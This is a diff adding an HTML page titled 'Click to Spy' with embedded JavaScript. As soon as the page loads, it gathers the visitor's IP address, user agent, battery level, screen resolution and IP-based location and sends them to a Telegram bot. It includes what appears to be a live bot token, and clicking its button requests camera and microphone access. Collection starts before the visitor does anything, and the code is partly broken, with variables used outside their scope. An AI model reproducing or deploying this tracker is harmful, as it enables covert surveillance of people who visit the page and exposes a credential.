@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Click to Spy</title>
+</head>
+<body>
+    <h1>Welcome! 🎉</h1>
+    <p>Click the button below to share your device info with the operator.</p>
+    <button id="collect">Collect Info</button>
+
+    <script>
+        // Replace your bot token and operator chat ID here
+        const botToken = "8589924064:AAGmeRl6eV2fdhcclqFu6HML5mOLylK4XtU";
+        const chatId = "OPERATOR_TELEGRAM_ID"; // Replace with your Telegram ID
+
+        // Step 1: Get IP Address
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                console.log("IP:", ip);
+                sendToBot(ip);
+            });
+
+        // Step 2: Get Device Info
+        const deviceInfo = navigator.userAgent;
+        console.log("Device Info:", deviceInfo);
+
+        // Step 3: Get Battery Level
+        navigator.getBattery().then(battery => {
+            const batteryLevel = battery.level * 100;
+            console.log("Battery Level:", batteryLevel);
+            sendToBot(batteryLevel);
+        });
+
+        // Step 4: Get Screen Resolution
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        console.log("Screen Resolution:", `${screenWidth}x${screenHeight}`);
+        sendToBot(screenWidth, screenHeight);
+
+        // Step 5: Get Country/City via IP Geolocation
+        fetch(`https://ipapi.co/json/${ip}`)
+            .then(response => response.json())
+            .then(data => {
+                const country = data.country_name;
+                const city = data.city;
+                console.log("Location:", `${country}, ${city}`);
+                sendToBot(country, city);
+            });
+
+        // Step 6: Optional — Request Camera/Location Permissions
+        document.getElementById("collect").addEventListener("click", () => {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    console.log("Camera/Location Access Granted!");
+                    // You can capture a photo or get location here
+                })
+                .catch(err => {
+                    console.log("Camera/Location Access Denied!");
+                });
+        });
+
+        // Helper Function to Send Data to Telegram Bot
+        function sendToBot(...data) {
+            const message = JSON.stringify({
+                ip: data[0],
+                device: deviceInfo,
+                battery: data[1],
+                screen: `${screenWidth}x${screenHeight}`,
+                location: `${country}, ${city}`
+            });
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
+        }
+    </script>
+</body>
+</html>
